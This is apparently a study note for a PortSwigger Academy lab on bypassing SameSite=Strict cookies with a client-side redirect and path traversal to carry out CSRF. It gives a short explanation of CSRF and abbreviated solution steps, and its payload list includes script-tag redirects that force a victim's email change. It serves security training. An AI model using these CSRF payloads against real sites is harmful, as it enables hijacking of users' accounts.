# Lab: SameSite Strict bypass via client-side redirect

**Official lab:** [Lab: SameSite Strict bypass via client-side redirect](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)

## Lab idea

This challenge examines a SameSite=Strict session alongside client-side redirect behavior. It practices reviewing in-scope navigation and redirect flows for unexpected authenticated requests.

## Vulnerability in brief
Cross-site request forgery (CSRF) is a web security vulnerability that tricks a user’s browser into sending an unintended, authenticated request to an application where that user is signed in. The browser may automatically attach session credentials, so the application can mistake the forged request for an action the user chose to perform. CSRF can also arise where browsers automatically supply credentials such as HTTP Basic authentication or client certificates. [Official topic](https://portswigger.net/web-security/csrf)

## Solution idea
1. In Burp's browser, log in to your own account and change your email address.
2. In Burp, go to the Proxy > HTTP history tab.
3. Study the POST /my-account/change-email request and notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSRF if you can bypass any SameSite cookie…
4. Look at the response to your POST /login request.
- …
6. Test the exploit on yourself and confirm that you have successfully changed your email address.
7. Change the email address in your exploit so that it doesn't match your own.
8. Deliver the exploit to the victim.

## Payloads / key values
- `POST /my-account/change-email`
- `POST /login`
- `SameSite=Strict`
- `/post/comment/confirmation?postId=x`
- `/resources/js/commentConfirmationRedirect.js`
- `postId`
- `GET /post/comment/confirmation?postId=x`
- `/post/comment/confirmation?postId=foo`
- `/post/foo`
- `/post/comment/confirmation?postId=1/../../my-account`
- `GET`
- `<script> document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account"; </script>`
- `<script> document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1"; </script>`
- `submit`

## Official source
- [PortSwigger Academy: Lab: SameSite Strict bypass via client-side redirect](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)
